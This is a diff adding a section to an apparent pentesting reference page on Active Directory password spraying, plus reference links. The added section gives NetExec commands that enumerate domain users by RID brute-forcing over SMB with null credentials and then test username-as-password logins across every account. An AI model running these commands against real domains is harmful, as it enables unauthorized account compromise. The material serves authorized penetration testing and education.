@@ -79,6 +79,22 @@ for u in $(cat users.txt); do
 done
 ```
 
+### Username = Password spray (NetExec)
+
+A quick, low-attempt check that often reveals weak accounts is testing username==password across all discovered users. NetExec can do this safely with no per-user bruteforce:
+
+```bash
+# Build a user list (RID brute via SMB with null/guest)
+netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
+
+# Test username=password without hammering each account
+netexec smb <dc_fqdn> -u users.txt -p users.txt --no-bruteforce --continue-on-success
+```
+
+Operational tips:
+- Use FQDN and ensure time sync with the DC if you pivot to Kerberos-based operations.
+- Validate any hits across other protocols (LDAP/WinRM/RDP) as needed.
+
 #### From Windows
 
 - With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
@@ -265,6 +281,8 @@ To use any of these tools, you need a user list and a password / a small list of
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [NetExec (CME successor)](https://github.com/Pennyw0rth/NetExec)
+- [HTB BabyTwo: SYSVOL logon script poisoning and AD ACL abuse to service-account takeover](https://0xdf.gitlab.io/2025/09/26/htb-babytwo.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
